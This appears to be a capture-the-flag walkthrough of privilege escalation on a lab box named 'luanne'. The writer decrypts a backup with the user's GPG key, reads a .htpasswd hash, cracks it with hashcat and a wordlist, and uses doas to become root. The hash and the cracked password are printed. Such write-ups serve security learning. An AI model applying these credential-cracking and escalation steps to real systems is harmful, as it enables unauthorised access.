## GNUPGP Key:
```Bash
luanne$ cd .gnupg/                                                                                                                       
luanne$ ls
pubring.gpg secring.gpg
luanne$ ls -la
total 16
drwx------  2 r.michaels  users   512 Sep 14  2020 .
dr-xr-x---  7 r.michaels  users   512 Sep 16  2020 ..
-rw-------  1 r.michaels  users   603 Sep 14  2020 pubring.gpg
-rw-------  1 r.michaels  users  1291 Sep 14  2020 secring.gpg
```

## Decypt Backups
```Bash
luanne$ cd backups/                                                                                                                      
luanne$ ls
devel_backup-2020-09-16.tar.gz.enc
luanne$ ls -la
total 12
dr-xr-xr-x  2 r.michaels  users   512 Nov 24 09:26 .
dr-xr-x---  7 r.michaels  users   512 Sep 16  2020 ..
-r--------  1 r.michaels  users  1970 Nov 24 09:25 devel_backup-2020-09-16.tar.gz.enc

luanne$ netpgp --decrypt --output=/tmp/backups.tar.gz devel_backup-2020-09-16.tar.gz.enc   
signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
uid              RSA 2048-bit key <r.michaels@localhost>

```
## Users password is in devel-2020-09-16/www/.htpasswd of decrypted tar file
```Bash
luanne$ cd /tmp
luanne$ ls
backups.tar.gz
luanne$ tar zxvf backups.tar.gz                                                                                                          
x devel-2020-09-16/
x devel-2020-09-16/www/
x devel-2020-09-16/webapi/
x devel-2020-09-16/webapi/weather.lua
x devel-2020-09-16/www/index.html
x devel-2020-09-16/www/.htpasswd

luanne$ ls -la
total 32
drwxr-xr-x  2 r.michaels  wheel   96 Sep 16  2020 .
drwxr-x---  4 r.michaels  wheel   96 Sep 16  2020 ..
-rw-r--r--  1 r.michaels  wheel   47 Sep 16  2020 .htpasswd
-rw-r--r--  1 r.michaels  wheel  378 Sep 16  2020 index.html
luanne$ cat .htpasswd                                                                                                                    
webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.

```

## Decrypting passwd gives out "littlebear"
```Bash
└──╼ $hashcat -m 500 --force hash2.txt /usr/share/wordlists/rockyou.txt
$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.:littlebear
luanne$ doas sh
Password:
# whoami
root$
#
```
